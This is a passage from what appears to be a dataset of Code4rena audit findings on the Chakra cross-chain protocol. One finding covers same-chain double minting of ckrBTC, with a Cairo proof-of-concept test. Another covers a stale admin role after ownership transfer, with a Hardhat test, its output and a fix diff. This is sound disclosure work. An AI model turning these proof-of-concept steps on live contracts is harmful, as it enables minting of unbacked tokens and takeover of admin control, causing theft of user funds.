and handler.\n\nThis creates a potential attack:\n1. The attacker sends a cross-chain message from Starknet and `handler_erc20` to the same chain and handler. This means the source chain equals the destination chain, and the source handler equals the destination handler. The parameters for `handler_erc20::cross_chain_erc20_settlement` would be:\n   - `to_chain`: Starknet\n   - `to_handler`: the same address as `handler_erc20`\n   - `to_token`: the same token address (`ckrBTC`)\n   - `to`: the recipient address (irrelevant for this vulnerability)\n   - `amount`: the token amount (irrelevant for this vulnerability)\n2. During the bridging process, there is no check that `to_chain` and `to_handler` are different from `from_chain` and `from_handler`.\n3. Once the validators sign the event (the validator implementation is out of scope), the message is received on Starknet, and `settlement::receive_cross_chain_msg` is called. This function does not prevent the attack.\n[Link to code](https://github.com/code-423n4/2024-08-chakra/blob/main/cairo/handler/src/settlement.cairo#L325)\n4. Then, `receive_cross_chain_msg::handler_erc20` is called:\n[Link to code](https://github.com/code-423n4/2024-08-chakra/blob/main/cairo/handler/src/settlement.cairo#L354)\n5. This function checks if `to_chain` and `to_handler` are supported, and since `to_chain = from_chain` and `to_handler = from_handler`, it passes.\n[Link to code](https://github.com/code-423n4/2024-08-chakra/blob/main/cairo/handler/src/handler_erc20.cairo#L114)\n6. Finally, the transfer or mint occurs. If the settlement mode is `LockMint`, the same amount of `ckrBTC` that was locked on Starknet will be minted on Starknet again. In other words, because the source and destination are the same, the locked token on the source is minted again on the same source. For example, if the attacker bridges 1000 `ckrBTC` from Starknet to Starknet, 1000 `ckrBTC` is locked on Starknet, and then 1000 `ckrBTC` is minted again, resulting in a total supply increase of 2000 `ckrBTC` on Starknet (1000 locked and 1000 minted).\n\nThis contradicts the core logic of the protocol, as explained:\n> \"In Chakra liquid staking, users first transfer Bitcoin to a multi-signature address supported by MuSig2. This event is captured by the indexer, which calls the on-chain contract to mint ckrBTC for the user. The Bitcoin in the multi-signature address is staked into Babylon. While holding ckrBTC, users continue to earn rewards from Babylon staking. When users want to end the staking, they can burn ckrBTC.\"\n[Link to source](https://blog.bitlayer.org/BIP-327_MuSig2_in_Four_Applications/)\n\n**This means that the amount of `ckrBTC` on Starknet is supposed to match the amount of BTC transferred to MuSig2. However, due to this attack, the amount of `ckrBTC` on Starknet can be maliciously increased and will not match the amount of BTC transferred to MuSig2.**\n\n### Summary:\nUnder normal conditions, a user locks `ckrBTC` on Starknet and receives tokens on another chain, enabling them to use Bitcoin-backed assets in DeFi protocols. But in this attack, the attacker locks `ckrBTC` on Starknet and bridges it to Starknet again to mint `ckrBTC` again. This causes the total supply of `ckrBTC` on Starknet to be higher than the amount of BTC in MuSig2, violating the core rule of the protocol.\n\n### Note:\nThis vulnerability does not depend on owner mistakes. The owner must have already added the source chain and handler to the `support_handler` mapping; otherwise, any call to `handler_erc20::receive_cross_chain_msg` would fail. On the EVM-based code, however, the owner does not need to add the source chain and handler to the `handler_whitelist` mapping, since `ChakraSettlementHandler::receive_cross_chain_msg` only checks that `from_chain` and `from_handler` are whitelisted, not `to_chain` and `to_handler`.\n```solidity\nif (is_valid_handler(from_chain, from_handler) == false) {\n    return false;\n}\n```\n[Link to code](https://github.com/code-423n4/2024-08-chakra/blob/main/solidity/handler/contracts/ChakraSettlementHandler.sol#L311)\n\n### Proof of Concept (PoC)\nIn the following test, `target_chain`, `target_token`, and `target_handler` are all set to `Starknet`, `ckrBTC`, and `erc20_handler` on Starknet, respectively. This shows that the transaction executes successfully, contrary to expectations.\n\n```javascript\nuse core::option::OptionTrait;\nuse core::traits::TryInto;\nuse settlement_cairo::ckr_btc::IckrBTCDispatcherTrait;\nuse openzeppelin::token::erc20::interface::IERC20DispatcherTrait;\nuse core::result::ResultTrait;\nuse core::box::BoxTrait;\nuse snforge_std::{declare, ContractClassTrait, start_prank, CheatTarget, stop_prank};\nuse starknet::ContractAddress;\nuse starknet::{get_tx_info, get_caller_address};\nuse settlement_cairo::interfaces::{IERC20HandlerDispatcher, IERC20HandlerDispatcherTrait, IChakraSettlementDispatcher, IChakraSettlementDispatcherTrait};\nuse settlement_cairo::codec::{decode_transfer, encode_transfer, ERC20Transfer, Message, decode_message, encode_message};\nuse settlement_cairo::utils::{u256_to_contract_address, contract_address_to_u256, u256_to_u8_array};\nuse settlement_cairo::ckr_btc::{IckrBTCDispatcher};\nuse openzeppelin::token::erc20::interface::IERC20Dispatcher;\n\n\n#[test]\nfn test_lock_mint_self(){\n    let source_chain = 'Starknet';\n    let target_address = 1;\n    let amount = 1000;\n    let owner_address = 0x5a9bd6214db5b229bd17a4050585b21c87fc0cadf9871f89a099d27ef800a40;\n    let attacker_address = 0x00112233445566778899aabbccddeeff;\n    let attacker = attacker_address.try_into().unwrap();\n\n\n    let settlement_contract = declare(\"ChakraSettlement\");\n    let settlement_address = settlement_contract.deploy(@array![owner_address, 1]).unwrap();\n    let ckrBTC_contract = declare(\"ckrBTC\");\n    let ckrBTC_address = ckrBTC_contract.deploy(@array![owner_address]).unwrap();\n    let erc20_handler = declare(\"ERC20Handler\");\n    let erc20_handler_address = erc20_handler.deploy(@array![settlement_address.into(),owner_address,ckrBTC_address.into(), 1]).unwrap();\n\n\n    let handler_dispath = IERC20HandlerDispatcher {contract_address: erc20_handler_address};\n    let ckrbtc_dispath = IckrBTCDispatcher{contract_address: ckrBTC_address};\n    let ckrbtc_erc20_dispath = IERC20Dispatcher{contract_address: ckrBTC_address};\n    // support handler\n    let owner = owner_address.try_into().unwrap();\n    start_prank(CheatTarget::One(erc20_handler_address), owner);\n    // add from_chain from_handler\n    handler_dispath.set_support_handler(source_chain, contract_address_to_u256(erc20_handler_address),true);\n\n    start_prank(CheatTarget::One(ckrBTC_address), owner);\n    ckrbtc_dispath.add_operator(erc20_handler_address);\n    ckrbtc_dispath.add_operator(owner);\n    // cross_chain_erc20_settlement\n    ckrbtc_dispath.mint_to(attacker, amount);\n    stop_prank(CheatTarget::One(ckrBTC_address));\n\n\n    ////////////// attack starts here\n    start_prank(CheatTarget::One(ckrBTC_address), attacker);\n    ckrbtc_erc20_dispath.approve(erc20_handler_address, amount);\n    stop_prank(CheatTarget::One(ckrBTC_address));\n\n    start_prank(CheatTarget::One(erc20_handler_address), attacker);\n    let target_chain = 'Starknet'; // attacker sets the target chain as source chain\n    let target_token = contract_address_to_u256(ckrBTC_address); // attacker sets the target token as source token\n    let target_handler = contract_address_to_u256(erc20_handler_address); // attacker sets the target handler as source handler\n    handler_dispath.cross_chain_erc20_settlement(target_chain, target_handler, target_token, target_address, amount);\n    stop_prank(CheatTarget::One(erc20_handler_address));\n\n    assert(ckrbtc_erc20_dispath.balance_of(attacker) == 0, 'balance error after cross');\n    assert(ckrbtc_erc20_dispath.balance_of(erc20_handler_address) == amount, 'handler balance error');\n\n    // receive_cross_chain_msg\n    start_prank(CheatTarget::One(erc20_handler_address), settlement_address);\n\n    assert(ckrbtc_erc20_dispath.balance_of(u256_to_contract_address(0x70997970c51812dc3a010c7d01b50e0d17dc79c8)) == 0, 'to_address balance error');\n    let message_array_u8 = array! [1, 226, 26, 80, 2, 232, 11, 172, 207, 254, 0, 95, 72, 69, 136, 99, 38, 6, 228, 108, 177, 62, 5, 10, 125, 58, 52, 32, 110, 139, 85, 224, 141, 5, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 243, 159, 214, 229, 26, 173, 136, 246, 244, 206, 106, 184, 130, 114, 121, 207, 255, 185, 34, 102, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 112, 153, 121, 112, 197, 24, 18, 220, 58, 1, 12, 125, 1, 181, 14, 13, 23, 220, 121, 200, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 231, 241, 114, 94, 119, 52, 206, 40, 143, 131, 103, 225, 187, 20, 62, 144, 187, 63, 5, 18, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 144, 247, 155, 246, 235, 44, 79, 135, 3, 101, 231, 133, 152, 46, 31, 16, 30, 147, 185, 6, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 3, 232];\n    handler_dispath.receive_cross_chain_msg(1, target_chain, source_chain, target_handler, erc20_handler_address, message_array_u8);\n    assert(ckrbtc_erc20_dispath.balance_of(u256_to_contract_address(0x70997970c51812dc3a010c7d01b50e0d17dc79c8)) == 1000, 'transfer error');\n}\n```\n\n## Tools Used\n\n## Recommended Mitigation Steps\nWhen bridging from Starknet, it should ensure that the source and destination are different.\n\n\n## Assessed type\n\nContext\n", "markdown_raw": "# Lines of code\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/main/cairo/handler/src/handler_erc20.cairo#L115\n\n\n# Vulnerability details\n\n## Impact\nIt is possible to bridge assets from Starknet to Starknet by setting `to_chain` and `to_handler` to be the same as `from_chain` and `from_handler`. This violates the core rule of the protocol, which is \"The contract maintains a consistent state between locking/burning tokens on the source chain and minting/unlocking on the destination chain, depending on the settlement mode.\"\n\nFor example, this could result in the total supply of `ckrBTC` on Starknet being higher than the amount of BTC transferred to MuSig2 on the Bitcoin network.\n\n## Proof of Concept\nWhen a message is received on Starknet, the `handler_erc20::receive_cross_chain_msg` function is called:\n[Link to code](https://github.com/code-423n4/2024-08-chakra/blob/main/cairo/handler/src/handler_erc20.cairo#L108)\n\nIn this function, it checks that both `to_chain` and `to_handler` as well as `from_chain` and `from_handler` are supported:\n```rust\nassert(self.support_handler.read((from_chain, from_handler)) && \n       self.support_handler.read((to_chain, contract_address_to_u256(to_handler))), 'not support handler');\n```\n[Link to code](https://github.com/code-423n4/2024-08-chakra/blob/main/cairo/handler/src/handler_erc20.cairo#L115)\n\n`to_chain` must be the Starknet chain name, and `to_handler` must be the contract address of `handler_erc20`.\n\nThis check forces the owner to already call `set_support_handler` to add support for `to_chain` and `to_handler`. Otherwise, any call to `handler_erc20::receive_cross_chain_msg` will fail:\n```rust\nfn set_support_handler(ref self: ContractState, chain_name: felt252, handler: u256, support: bool) {\n    self.ownable.assert_only_owner();\n    self.support_handler.write((chain_name, handler), support);\n}\n```\n[Link to code](https://github.com/code-423n4/2024-08-chakra/blob/main/cairo/handler/src/handler_erc20.cairo#L238)\n\nAt first glance, this seems redundant. Why should the Starknet chain and its handler be added to the `support_handler` mapping within the same handler? For example, if the chain name is `Starknet` and the handler address is `0xaa`, calling `support_handler.read('Starknet', 0xaa)` returns `1`. This mapping should only record valid destination chains and handler addresses, not its own chain and handler.\n\nThis creates a potential attack:\n1. The attacker sends a cross-chain message from Starknet and `handler_erc20` to the same chain and handler. This means the source chain equals the destination chain, and the source handler equals the destination handler. The parameters for `handler_erc20::cross_chain_erc20_settlement` would be:\n   - `to_chain`: Starknet\n   - `to_handler`: the same address as `handler_erc20`\n   - `to_token`: the same token address (`ckrBTC`)\n   - `to`: the recipient address (irrelevant for this vulnerability)\n   - `amount`: the token amount (irrelevant for this vulnerability)\n2. During the bridging process, there is no check that `to_chain` and `to_handler` are different from `from_chain` and `from_handler`.\n3. Once the validators sign the event (the validator implementation is out of scope), the message is received on Starknet, and `settlement::receive_cross_chain_msg` is called. This function does not prevent the attack.\n[Link to code](https://github.com/code-423n4/2024-08-chakra/blob/main/cairo/handler/src/settlement.cairo#L325)\n4. Then, `receive_cross_chain_msg::handler_erc20` is called:\n[Link to code](https://github.com/code-423n4/2024-08-chakra/blob/main/cairo/handler/src/settlement.cairo#L354)\n5. This function checks if `to_chain` and `to_handler` are supported, and since `to_chain = from_chain` and `to_handler = from_handler`, it passes.\n[Link to code](https://github.com/code-423n4/2024-08-chakra/blob/main/cairo/handler/src/handler_erc20.cairo#L114)\n6. Finally, the transfer or mint occurs. If the settlement mode is `LockMint`, the same amount of `ckrBTC` that was locked on Starknet will be minted on Starknet again. In other words, because the source and destination are the same, the locked token on the source is minted again on the same source. For example, if the attacker bridges 1000 `ckrBTC` from Starknet to Starknet, 1000 `ckrBTC` is locked on Starknet, and then 1000 `ckrBTC` is minted again, resulting in a total supply increase of 2000 `ckrBTC` on Starknet (1000 locked and 1000 minted).\n\nThis contradicts the core logic of the protocol, as explained:\n> \"In Chakra liquid staking, users first transfer Bitcoin to a multi-signature address supported by MuSig2. This event is captured by the indexer, which calls the on-chain contract to mint ckrBTC for the user. The Bitcoin in the multi-signature address is staked into Babylon. While holding ckrBTC, users continue to earn rewards from Babylon staking. When users want to end the staking, they can burn ckrBTC.\"\n[Link to source](https://blog.bitlayer.org/BIP-327_MuSig2_in_Four_Applications/)\n\n**This means that the amount of `ckrBTC` on Starknet is supposed to match the amount of BTC transferred to MuSig2. However, due to this attack, the amount of `ckrBTC` on Starknet can be maliciously increased and will not match the amount of BTC transferred to MuSig2.**\n\n### Summary:\nUnder normal conditions, a user locks `ckrBTC` on Starknet and receives tokens on another chain, enabling them to use Bitcoin-backed assets in DeFi protocols. But in this attack, the attacker locks `ckrBTC` on Starknet and bridges it to Starknet again to mint `ckrBTC` again. This causes the total supply of `ckrBTC` on Starknet to be higher than the amount of BTC in MuSig2, violating the core rule of the protocol.\n\n### Note:\nThis vulnerability does not depend on owner mistakes. The owner must have already added the source chain and handler to the `support_handler` mapping; otherwise, any call to `handler_erc20::receive_cross_chain_msg` would fail. On the EVM-based code, however, the owner does not need to add the source chain and handler to the `handler_whitelist` mapping, since `ChakraSettlementHandler::receive_cross_chain_msg` only checks that `from_chain` and `from_handler` are whitelisted, not `to_chain` and `to_handler`.\n```solidity\nif (is_valid_handler(from_chain, from_handler) == false) {\n    return false;\n}\n```\n[Link to code](https://github.com/code-423n4/2024-08-chakra/blob/main/solidity/handler/contracts/ChakraSettlementHandler.sol#L311)\n\n### Proof of Concept (PoC)\nIn the following test, `target_chain`, `target_token`, and `target_handler` are all set to `Starknet`, `ckrBTC`, and `erc20_handler` on Starknet, respectively. This shows that the transaction executes successfully, contrary to expectations.\n\n```javascript\nuse core::option::OptionTrait;\nuse core::traits::TryInto;\nuse settlement_cairo::ckr_btc::IckrBTCDispatcherTrait;\nuse openzeppelin::token::erc20::interface::IERC20DispatcherTrait;\nuse core::result::ResultTrait;\nuse core::box::BoxTrait;\nuse snforge_std::{declare, ContractClassTrait, start_prank, CheatTarget, stop_prank};\nuse starknet::ContractAddress;\nuse starknet::{get_tx_info, get_caller_address};\nuse settlement_cairo::interfaces::{IERC20HandlerDispatcher, IERC20HandlerDispatcherTrait, IChakraSettlementDispatcher, IChakraSettlementDispatcherTrait};\nuse settlement_cairo::codec::{decode_transfer, encode_transfer, ERC20Transfer, Message, decode_message, encode_message};\nuse settlement_cairo::utils::{u256_to_contract_address, contract_address_to_u256, u256_to_u8_array};\nuse settlement_cairo::ckr_btc::{IckrBTCDispatcher};\nuse openzeppelin::token::erc20::interface::IERC20Dispatcher;\n\n\n#[test]\nfn test_lock_mint_self(){\n    let source_chain = 'Starknet';\n    let target_address = 1;\n    let amount = 1000;\n    let owner_address = 0x5a9bd6214db5b229bd17a4050585b21c87fc0cadf9871f89a099d27ef800a40;\n    let attacker_address = 0x00112233445566778899aabbccddeeff;\n    let attacker = attacker_address.try_into().unwrap();\n\n\n    let settlement_contract = declare(\"ChakraSettlement\");\n    let settlement_address = settlement_contract.deploy(@array![owner_address, 1]).unwrap();\n    let ckrBTC_contract = declare(\"ckrBTC\");\n    let ckrBTC_address = ckrBTC_contract.deploy(@array![owner_address]).unwrap();\n    let erc20_handler = declare(\"ERC20Handler\");\n    let erc20_handler_address = erc20_handler.deploy(@array![settlement_address.into(),owner_address,ckrBTC_address.into(), 1]).unwrap();\n    \n\n    let handler_dispath = IERC20HandlerDispatcher {contract_address: erc20_handler_address};\n    let ckrbtc_dispath = IckrBTCDispatcher{contract_address: ckrBTC_address};\n    let ckrbtc_erc20_dispath = IERC20Dispatcher{contract_address: ckrBTC_address};\n    // support handler\n    let owner = owner_address.try_into().unwrap();\n    start_prank(CheatTarget::One(erc20_handler_address), owner);\n    // add from_chain from_handler\n    handler_dispath.set_support_handler(source_chain, contract_address_to_u256(erc20_handler_address),true);\n\n    start_prank(CheatTarget::One(ckrBTC_address), owner);\n    ckrbtc_dispath.add_operator(erc20_handler_address);\n    ckrbtc_dispath.add_operator(owner);\n    // cross_chain_erc20_settlement\n    ckrbtc_dispath.mint_to(attacker, amount);\n    stop_prank(CheatTarget::One(ckrBTC_address));\n\n\n    ////////////// attack starts here\n    start_prank(CheatTarget::One(ckrBTC_address), attacker);\n    ckrbtc_erc20_dispath.approve(erc20_handler_address, amount);\n    stop_prank(CheatTarget::One(ckrBTC_address));\n    \n    start_prank(CheatTarget::One(erc20_handler_address), attacker);\n    let target_chain = 'Starknet'; // attacker sets the target chain as source chain\n    let target_token = contract_address_to_u256(ckrBTC_address); // attacker sets the target token as source token\n    let target_handler = contract_address_to_u256(erc20_handler_address); // attacker sets the target handler as source handler\n    handler_dispath.cross_chain_erc20_settlement(target_chain, target_handler, target_token, target_address, amount);\n    stop_prank(CheatTarget::One(erc20_handler_address));\n\n    assert(ckrbtc_erc20_dispath.balance_of(attacker) == 0, 'balance error after cross');\n    assert(ckrbtc_erc20_dispath.balance_of(erc20_handler_address) == amount, 'handler balance error');\n\n    // receive_cross_chain_msg\n    start_prank(CheatTarget::One(erc20_handler_address), settlement_address);\n\n    assert(ckrbtc_erc20_dispath.balance_of(u256_to_contract_address(0x70997970c51812dc3a010c7d01b50e0d17dc79c8)) == 0, 'to_address balance error');\n    let message_array_u8 = array! [1, 226, 26, 80, 2, 232, 11, 172, 207, 254, 0, 95, 72, 69, 136, 99, 38, 6, 228, 108, 177, 62, 5, 10, 125, 58, 52, 32, 110, 139, 85, 224, 141, 5, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 243, 159, 214, 229, 26, 173, 136, 246, 244, 206, 106, 184, 130, 114, 121, 207, 255, 185, 34, 102, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 112, 153, 121, 112, 197, 24, 18, 220, 58, 1, 12, 125, 1, 181, 14, 13, 23, 220, 121, 200, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 231, 241, 114, 94, 119, 52, 206, 40, 143, 131, 103, 225, 187, 20, 62, 144, 187, 63, 5, 18, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 144, 247, 155, 246, 235, 44, 79, 135, 3, 101, 231, 133, 152, 46, 31, 16, 30, 147, 185, 6, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 3, 232];\n    handler_dispath.receive_cross_chain_msg(1, target_chain, source_chain, target_handler, erc20_handler_address, message_array_u8);\n    assert(ckrbtc_erc20_dispath.balance_of(u256_to_contract_address(0x70997970c51812dc3a010c7d01b50e0d17dc79c8)) == 1000, 'transfer error');\n}\n```\n\n## Tools Used\n\n## Recommended Mitigation Steps\nWhen bridging from Starknet, it should ensure that the source and destination are different.\n\n\n## Assessed type\n\nContext"}, "severity": "Medium", "difficulty": null, "type": "bug", "finding_id": null, "target": {"path": null, "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/code-423n4/2024-08-chakra", "org": "code-423n4", "name": "2024-08-chakra", "commit": "abef77d95866f2fec93270491fc5abc9ab14f86d", "branch": null, "relative_file": null, "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "github:code-423n4/2024-08-chakra-findings", "source_mtime": null, "report_extracted_at": "2025-11-19T10:34:16.759106+00:00", "report_extractor_version": "github-issues-0.1", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-19T10:34:16.773080+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Medium", "Difficulty": null, "Type": "bug", "Finding ID": null, "Target": null, "Severity_normalized": "Medium"}}
{"schema_version": "0.1", "scvd_id": "SCVD-github:code-423n4/2024-08-chakra-findings-054", "doc_id": "github:code-423n4/2024-08-chakra-findings", "finding_index": 54, "page_start": null, "title": "Ownership transfer does not update `DEFAULT_ADMIN_ROLE` properly on EVM-based blockchains", "short_summary": null, "description_md": null, "full_markdown": "# Lines of code\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/main/solidity/settlement/contracts/BaseSettlement.sol#L12\nhttps://github.com/code-423n4/2024-08-chakra/blob/main/solidity/handler/contracts/SettlementSignatureVerifier.sol#L11\nhttps://github.com/code-423n4/2024-08-chakra/blob/main/solidity/settlement/contracts/SettlementSignatureVerifier.sol#L17\n\n\n# Vulnerability details\n\n## Impact\nWhen ownership is transferred, the `DEFAULT_ADMIN_ROLE` is not revoked from the old owner, nor is it granted to the new owner. The `DEFAULT_ADMIN_ROLE` is the admin role for all other roles, which means only accounts with this role can grant or revoke roles. This flaw could lead to serious security issues.\n\n## Proof of Concept\nThree contracts`solidity/settlement/contracts/BaseSettlement.sol`, `solidity/handler/contracts/SettlementSignatureVerifier.sol`, and `solidity/settlement/contracts/SettlementSignatureVerifier.sol`inherit the `OwnableUpgradeable` contract:\n- [BaseSettlement.sol](https://github.com/code-423n4/2024-08-chakra/blob/main/solidity/settlement/contracts/BaseSettlement.sol#L12)\n- [SettlementSignatureVerifier.sol](https://github.com/code-423n4/2024-08-chakra/blob/main/solidity/handler/contracts/SettlementSignatureVerifier.sol#L11)\n- [SettlementSignatureVerifier.sol](https://github.com/code-423n4/2024-08-chakra/blob/main/solidity/settlement/contracts/SettlementSignatureVerifier.sol#L17)\n\nIn these contracts, the `DEFAULT_ADMIN_ROLE` is assigned to the `owner` during initialization:\n- [BaseSettlement.sol](https://github.com/code-423n4/2024-08-chakra/blob/main/solidity/settlement/contracts/BaseSettlement.sol#L64)\n- [SettlementSignatureVerifier.sol](https://github.com/code-423n4/2024-08-chakra/blob/main/solidity/handler/contracts/SettlementSignatureVerifier.sol#L53)\n- [SettlementSignatureVerifier.sol](https://github.com/code-423n4/2024-08-chakra/blob/main/solidity/settlement/contracts/SettlementSignatureVerifier.sol#L64)\n\nThe problem arises when ownership is transferred: the `DEFAULT_ADMIN_ROLE` is not removed from the old owner, nor is it assigned to the new owner. This means the old owner retains the `DEFAULT_ADMIN_ROLE`. For example, in the `TokenRoles` contract, this issue is properly handled, as it revokes the role from the old owner and assigns it to the new one:\n```solidity\nfunction transferOwnership(address newOwner) public override onlyOwner {\n    _revokeRole(DEFAULT_ADMIN_ROLE, msg.sender);\n    _grantRole(DEFAULT_ADMIN_ROLE, newOwner);\n    _transferOwnership(newOwner);\n}\n```\nhttps://github.com/code-423n4/2024-08-chakra/blob/main/solidity/handler/contracts/TokenRoles.sol#L25\n\nBy default, the admin role for all roles is `DEFAULT_ADMIN_ROLE`, meaning only accounts with this role can grant or revoke other roles.\nhttps://github.com/OpenZeppelin/openzeppelin-contracts-upgradeable/blob/v5.0.2/contracts/access/AccessControlUpgradeable.sol#L40\n\nIf an owner's account is compromised, ownership must be transferred to a new address immediately. However, since the old, compromised owner still holds the `DEFAULT_ADMIN_ROLE`, they could still fully exploit the system. For example, the old owner could assign a malicious manager role that could set `required_validators` to zero, allowing any fake message to be accepted and executed on the destination chain without any validator signatures, which could lead to theft of funds.\n- [SettlementSignatureVerifier.sol](https://github.com/code-423n4/2024-08-chakra/blob/main/solidity/settlement/contracts/SettlementSignatureVerifier.sol#L139)\n- [ChakraSettlement.sol](https://github.com/code-423n4/2024-08-chakra/blob/main/solidity/settlement/contracts/ChakraSettlement.sol#L195)\n\n### PoC\nIn the test `Transfer ownership issue`, the initial owner has the address `0x90F79bf6EB2c4f870365E785982E1f101E93b906` and holds the `DEFAULT_ADMIN_ROLE`. When ownership is transferred to a new owner at address `0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266`, the result shows that the new owner does not receive the `DEFAULT_ADMIN_ROLE`, while the old owner still retains this role.\n\n```javascript\nimport { expect } from \"chai\";\nimport {\n    loadFixture,\n} from \"@nomicfoundation/hardhat-toolbox/network-helpers\";\n\nimport hre, { ethers } from \"hardhat\";\nimport { Contract } from \"ethers\";\nimport { HardhatEthersSigner } from \"@nomicfoundation/hardhat-ethers/signers\";\n\ndescribe(\"ChakraSettlement\", function () {\n    const chainId = 1;\n    const chainName = \"test\"\n    const requiredValidators = 2;\n    const decimals = 8;\n    const name = \"MyToken\"\n    const symbol = \"MKT\"\n    const noBurn = false;\n\n    async function deploySettlementFixture() {\n        const [\n            tokenOwner,\n            tokenOperator,\n            manager,\n            settlementOwner,\n            settlementHnadlerOwner,\n        ] = await hre.ethers.getSigners();\n        const MyToken = await hre.ethers.getContractFactory(\"MyToken\");\n        const tokenInstance = await hre.upgrades.deployProxy(MyToken, [\n            await tokenOwner.getAddress(),\n            await tokenOperator.getAddress(),\n            name,\n            symbol,\n            decimals\n        ]);\n\n        const SettlementSignatureVerifier = await hre.ethers.getContractFactory(\"SettlementSignatureVerifier\");\n        const verifierInstance = await hre.upgrades.deployProxy(SettlementSignatureVerifier, [\n            await settlementOwner.getAddress(),\n            requiredValidators\n        ]);\n\n\n        const ChakraSettlement = await hre.ethers.getContractFactory(\"ChakraSettlement\");\n        const settlmentInstance = await hre.upgrades.deployProxy(ChakraSettlement, [\n            chainName,\n            BigInt(chainId),\n            await settlementOwner.getAddress(),\n            [await manager.getAddress()],\n            BigInt(requiredValidators),\n            await verifierInstance.getAddress(),\n        ]);\n\n        const ERC20CodecV1 = await hre.ethers.getContractFactory('ERC20CodecV1');\n        const codecInstance = await hre.upgrades.deployProxy(ERC20CodecV1, [\n            await settlementHnadlerOwner.getAddress(),\n        ])\n        const ERC20SettlementHandler = await hre.ethers.getContractFactory('ERC20SettlementHandler');\n        const settlementHandlerInstance = await hre.upgrades.deployProxy(ERC20SettlementHandler, [\n            await settlementHnadlerOwner.getAddress(), // owner\n            noBurn, // no_burn\n            chainName, //chain\n            await tokenInstance.getAddress(), // token\n            await codecInstance.getAddress(), // codec\n            await verifierInstance.getAddress(), // verifier\n            await settlmentInstance.getAddress(), // settlement\n\n        ])\n\n        const MessageLibTest = await hre.ethers.getContractFactory('MessageLibTest')\n        const messageLibTestInstance = await MessageLibTest.deploy()\n\n        // Approval operator role\n        await tokenInstance.connect(tokenOwner).add_operator(await settlementHandlerInstance.getAddress())\n\n        return { tokenInstance, codecInstance, settlmentInstance, settlementHandlerInstance, verifierInstance, messageLibTestInstance, tokenOwner, tokenOperator, manager, settlementOwner, settlementHnadlerOwner }\n    }\n\n    it(\"Transfer ownership issue\", async function () {\n        const [newOwner] = await hre.ethers.getSigners();\n        const newOwnerAddress = await newOwner.getAddress();\n        const { tokenInstance, settlmentInstance, settlementHandlerInstance, codecInstance, verifierInstance, messageLibTestInstance, manager, settlementOwner} = await loadFixture(deploySettlementFixture)\n\n        console.log(\"owner: \", await settlmentInstance.owner());\n        console.log(\"owner has DEFAULT_ADMIN role: \", await settlmentInstance.hasRole(hre.ethers.ZeroHash, await settlementOwner.getAddress()));\n        await settlmentInstance.connect(settlementOwner).transferOwnership(newOwnerAddress);\n        console.log(\"new owner: \", await settlmentInstance.owner());\n        console.log(\"old owner has DEFAULT_ADMIN role: \", await settlmentInstance.hasRole(hre.ethers.ZeroHash, await settlementOwner.getAddress()));\n        console.log(\"new owner has DEFAULT_ADMIN role: \", await settlmentInstance.hasRole(hre.ethers.ZeroHash, await settlmentInstance.owner()));\n    })\n});\n```\n\nThe output log is:\n```console\n  ChakraSettlement\nowner:  0x90F79bf6EB2c4f870365E785982E1f101E93b906\nowner has DEFAULT_ADMIN role:  true\nnew owner:  0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266\nold owner has DEFAULT_ADMIN role:  true\nnew owner has DEFAULT_ADMIN role:  false\n```\n\n## Tools Used\n\n## Recommended Mitigation Steps\nA function similar to the one implemented in `TokenRoles` should also be added to these three contracts.\n```diff\n+   function transferOwnership(address newOwner) public override onlyOwner {\n+       _revokeRole(DEFAULT_ADMIN_ROLE, msg.sender);\n+       _grantRole(DEFAULT_ADMIN_ROLE, newOwner);\n+       _transferOwnership(newOwner);\n+   }\n```\n\n\n## Assessed type\n\nContext\n", "sections": {"description_md": null, "impact_md": "## Impact\nWhen ownership is transferred, the `DEFAULT_ADMIN_ROLE` is not revoked from the old owner, nor is it granted to the new owner. The `DEFAULT_ADMIN_ROLE` is the admin role for all other roles, which means only accounts with this role can grant or revoke roles. This flaw could lead to serious security issues.\n", "recommendation_md": "## Recommended Mitigation Steps\nA function similar to the one implemented in `TokenRoles` should also be added to these three contracts.\n```diff\n+   function transferOwnership(address newOwner) public override onlyOwner {\n+       _revokeRole(DEFAULT_ADMIN_ROLE, msg.sender);\n+       _grantRole(DEFAULT_ADMIN_ROLE, newOwner);\n+       _transferOwnership(newOwner);\n+   }\n```\n\n\n## Assessed type\n\nContext\n", "poc_md": "## Proof of Concept\nThree contracts`solidity/settlement/contracts/BaseSettlement.sol`, `solidity/handler/contracts/SettlementSignatureVerifier.sol`, and `solidity/settlement/contracts/SettlementSignatureVerifier.sol`inherit the `OwnableUpgradeable` contract:\n- [BaseSettlement.sol](https://github.com/code-423n4/2024-08-chakra/blob/main/solidity/settlement/contracts/BaseSettlement.sol#L12)\n- [SettlementSignatureVerifier.sol](https://github.com/code-423n4/2024-08-chakra/blob/main/solidity/handler/contracts/SettlementSignatureVerifier.sol#L11)\n- [SettlementSignatureVerifier.sol](https://github.com/code-423n4/2024-08-chakra/blob/main/solidity/settlement/contracts/SettlementSignatureVerifier.sol#L17)\n\nIn these contracts, the `DEFAULT_ADMIN_ROLE` is assigned to the 